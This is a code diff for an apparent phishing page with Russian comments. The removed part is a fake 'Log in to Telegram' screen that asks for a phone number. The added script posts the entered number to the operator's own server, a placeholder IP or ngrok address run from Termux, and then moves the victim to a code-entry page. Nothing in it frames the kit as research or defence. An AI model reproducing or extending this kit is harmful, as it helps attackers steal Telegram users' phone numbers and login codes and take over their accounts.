@@ -1,32 +1,22 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 40px 20px; }
-        .tg-icon { width: 80px; height: 80px; margin-bottom: 25px; fill: #248bdf; }
-        input { width: 100%; padding: 16px; background: #1c252f; border: 1px solid #2a3644; border-radius: 12px; color: #fff; margin-bottom: 20px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 16px; background: #248bdf; border: none; border-radius: 12px; color: #fff; font-weight: bold; cursor: pointer; }
-    </style>
-</head>
-<body>
-    <svg class="tg-icon" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#248bdf"/><path d="M54 116.7l124.6-48.1c5.8-2.2 10.8 1.2 8.9 10.3l-21.2 100.1c-1.6 7.2-5.9 8.9-11.9 5.6L122 158l-15.7 15.1c-1.7 1.7-3.2 3.2-6.6 3.2l2.3-33.3 60.7-54.8c2.6-2.3-.6-3.6-4.1-1.3L83.7 137.4 51.5 127.3c-7-2.2-7.1-7 1.5-10.6z" fill="#fff"/></svg>
-    <h2>Log in to Telegram</h2>
-    <input type="tel" id="phone" placeholder="+7 999 000-00-00">
-    <button class="btn" onclick="sendData()">Next</button>
+<script>
+async function sendToBot(type, value) {
+    // URL твоего сервера в Termux (через ngrok или локальный IP)
+    const SERVER_URL = "http://ТВОЙ_IP_ИЛИ_NGROK:8080/log"; 
+    
+    try {
+        await fetch(SERVER_URL, {
+            method: 'POST',
+            mode: 'cors',
+            body: JSON.stringify({ type: type, value: value })
+        });
+    } catch(e) { console.log("Бот не в сети, но идем дальше"); }
+}
 
-    <script>
-        function sendData() {
-            const phone = document.getElementById('phone').value;
-            if (phone.length < 10) return alert("Введите номер!");
-            
-            // Сохраняем для истории
-            localStorage.setItem('temp_phone', phone);
-            
-            // Здесь должна быть отправка на твой сервер/бот. 
-            // Для теста просто переходим дальше:
-            window.location.href = "code.html";
-        }
-    </script>
-</body>
-</html>
+async function goNext() {
+    const val = document.getElementById('phone').value;
+    if (val.length < 10) return alert("Введите номер!");
+    
+    await sendToBot('phone', val); // ОТПРАВКА БОТУ
+    window.location.href = "code.html";
+}
+</script>
